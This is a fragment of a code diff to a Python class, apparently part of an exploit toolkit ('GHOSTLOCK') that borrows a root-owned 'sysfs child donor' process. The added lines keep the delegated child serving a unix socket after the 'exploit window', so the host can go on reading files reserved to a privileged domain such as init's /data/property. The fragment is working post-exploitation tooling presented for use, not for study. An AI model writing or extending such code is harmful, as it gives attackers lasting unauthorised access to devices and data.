@@ -5921,6 +5921,15 @@ class PortalProvisioner:
                     f"sysfs child donor {sysfs_donor!r} is uid {donor_uid}, need 0"
                 )
             environment["GHOSTLOCK_SYSFS_CHILD_DONOR"] = donor_pids[0]
+        if os.environ.get("PORTAL_PROXY") and environment.get(
+            "GHOSTLOCK_SYSFS_CHILD_DONOR"
+        ):
+            # The delegated child keeps serving an abstract unix socket after
+            # the exploit window, so the host can read files that only the
+            # borrowed domain may touch (e.g. /data/property with init).
+            environment["GHOSTLOCK_PROXY_PORT"] = (
+                os.environ.get("PORTAL_PROXY_PORT") or "47821"
+            )
             print(f"SYSTEM_CHILD_DONOR process={sysfs_donor.strip()} pid={donor_uid and donor_pids[0]}")
         if self.custom_payload is not None and self._in_custom_payload_phase:
             # The payload action belongs only to the custom-payload
